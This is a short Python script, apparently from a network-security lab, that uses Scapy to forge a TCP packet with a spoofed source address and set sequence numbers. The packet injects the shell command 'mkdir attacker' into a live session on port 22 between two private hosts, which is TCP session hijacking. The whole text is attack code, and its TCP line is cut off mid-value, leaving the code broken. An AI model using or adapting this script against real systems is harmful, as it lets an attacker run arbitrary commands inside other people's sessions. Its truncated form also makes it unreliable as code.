import sys
from scapy.all import *

print("sending session hijacking packet...")
IPLayer = IP (src="10.10.10.198", dst = "10.10.10.184")
TCPLayer = TCP (sport=56680, dport=22, flags="A", seq=2531475496, ack=200212124>
Data = "\r mkdir attacker \r"
pkt=IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)



